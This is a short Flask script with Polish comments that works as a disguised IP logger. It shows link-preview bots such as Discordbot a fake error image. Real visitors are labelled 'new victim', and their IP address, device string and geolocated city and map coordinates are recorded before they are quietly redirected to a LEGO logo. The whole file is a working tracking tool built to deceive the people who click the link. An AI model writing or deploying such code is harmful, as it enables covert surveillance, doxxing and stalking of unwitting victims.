from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
# Nowy, lepszy obrazek błędu (czystszy)
ERROR_IMG = "http://googleusercontent.com/image_collection/image_retrieval/15050586936953913730_0"
# Zdjęcie docelowe
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta property="og:site_name" content=" ">
    <meta property="og:title" content=" ">
    <meta property="og:image" content="{ERROR_IMG}">
    <meta property="og:image:type" content="image/png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="{ERROR_IMG}">
    <meta http-equiv="refresh" content="0; url={REAL_IMG}">
</head>
<body style="background-color: #36393f;"></body>
</html>
'''

@app.route('/image.png')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    if "Discordbot" in ua or "externalhit" in ua.lower():
        return render_template_string(HTML_TEMPLATE)

    # LOGOWANIE DANYCH
    print(f"\n[!!!] NOWA OFIARA: {ip}")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('regionName')}, {r.get('country')}")
            print(f"MAPA: http://www.google.com/maps/place/{r.get('lat')},{r.get('lon')}")
    except: pass
    print(f"URZĄDZENIE: {ua}\n")

    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
